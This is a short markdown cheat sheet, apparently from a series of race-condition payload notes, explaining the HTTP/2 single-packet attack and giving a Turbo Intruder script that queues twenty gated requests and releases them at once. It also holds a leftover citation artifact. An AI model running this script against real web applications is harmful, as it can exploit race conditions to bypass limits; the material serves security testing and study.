# Payload 07 – Single-Packet Attack

## Purpose

The single-packet attack is used to minimize network jitter when sending multiple HTTP/2 requests simultaneously.

It is particularly useful when the race window is extremely small.

---

## Requirements

The source notes:

```text
HTTP/2
Turbo Intruder
Engine.BURP2
concurrentConnections=1
```

The technique is incompatible with HTTP/1. :contentReference[oaicite:12]{index=12}

---

## Turbo Intruder Structure

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    for i in range(20):
        engine.queue(
            target.req,
            gate='1'
        )

    engine.openGate('1')
```

---

## Flow

```text
Queue requests
      ↓
Assign same gate
      ↓
Keep connection synchronized
      ↓
openGate()
      ↓
Release requests together
```

---

## Why It Helps

Normal parallel requests can still experience network jitter.

The single-packet approach attempts to send the requests in a highly synchronized manner.

This increases the probability that they overlap inside the race window.